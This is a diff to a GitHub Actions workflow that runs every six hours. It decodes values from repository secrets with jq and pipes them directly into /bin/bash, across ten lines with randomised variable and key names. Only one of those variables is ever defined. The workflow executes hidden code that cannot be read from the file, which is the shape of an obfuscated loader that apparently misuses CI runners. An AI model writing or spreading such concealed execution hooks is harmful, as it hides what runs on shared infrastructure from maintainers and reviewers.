@@ -3,22 +3,25 @@ name: chuconglong7816
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
-jobs:  # 3133
+    - cron: '9 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chuconglong7816
         env:
-          om2: ${{ secrets.om2 }}
+          pw348: ${{ secrets.pw348 }}
         run: |
-          echo $om2 | jq -r .bbplv78160 | /bin/bash
-          echo $uf77109 | jq -r .eego0936 | /bin/bash
-          echo $x86 | jq -r .zfyg4522 | /bin/bash
-          echo $ksl24 | jq -r .eg2 | /bin/bash
-          echo $ynxdx163 | jq -r .bjt0177 | /bin/bash
-          echo $mn750 | jq -r .ztdxg253 | /bin/bash
-          echo $p46126 | jq -r .f1594 | /bin/bash
+          echo $pw348 | jq -r .r1 | /bin/bash
+          echo $x26297 | jq -r .lr7922 | /bin/bash
+          echo $bqna46344 | jq -r .mw4843 | /bin/bash
+          echo $wrnzq4 | jq -r .ju7433 | /bin/bash
+          echo $k5 | jq -r .sdzkd84375 | /bin/bash
+          echo $euvi9 | jq -r .ieq597 | /bin/bash
+          echo $ior12722 | jq -r .qkirp10 | /bin/bash
+          echo $wy50595 | jq -r .vbp632 | /bin/bash
+          echo $g48 | jq -r .nr061 | /bin/bash
+          echo $xfeq7237 | jq -r .e2 | /bin/bash
 
